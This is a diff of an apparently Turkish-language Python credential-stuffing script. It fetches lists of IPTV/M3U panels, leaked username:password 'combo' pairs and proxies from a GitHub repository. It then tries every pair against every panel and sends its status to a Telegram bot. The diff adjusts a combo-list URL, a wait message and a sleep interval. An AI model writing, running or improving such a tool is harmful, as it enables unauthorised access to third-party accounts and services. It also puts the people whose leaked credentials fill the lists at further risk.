@@ -74,8 +74,9 @@ def m3u_tara(panel, user, pas, proxy_listesi):
     return False
 
 def arka_plan_tarayici():
+    # Videodaki klasör yapına birebir uyumlu linkler:
     PANEL_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/panel_list/benzersiz_paneller.txt"
-    COMBO_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/combo/userpass.txt"
+    COMBO_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/combo/userpass"
     PROXY_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/proxy/proxy.txt"
     
     while True:
@@ -108,12 +109,13 @@ def arka_plan_tarayici():
             except:
                 pass
 
+            # Eğer listeler boşsa Telegram'a detay ver ki nerenin boş olduğunu görebilelim
             if not paneller or not combolar:
-                telegrama_gonder("⚠️ <b>Panel veya Combo listesi boş, bekleniyor...</b>")
-                time.sleep(120)
+                telegrama_gonder(f"⚠️ <b>Bekleniyor:</b> Panel ({len(paneller)}), Combo ({len(combolar)})")
+                time.sleep(60)
                 continue
 
-            # Direkt M3U Taraması
+            # M3U Tarama Başlat
             telegrama_gonder("⏳ <b>M3U tarama başlatıldı</b>")
             for panel in paneller:
                 for user, pas in combolar:
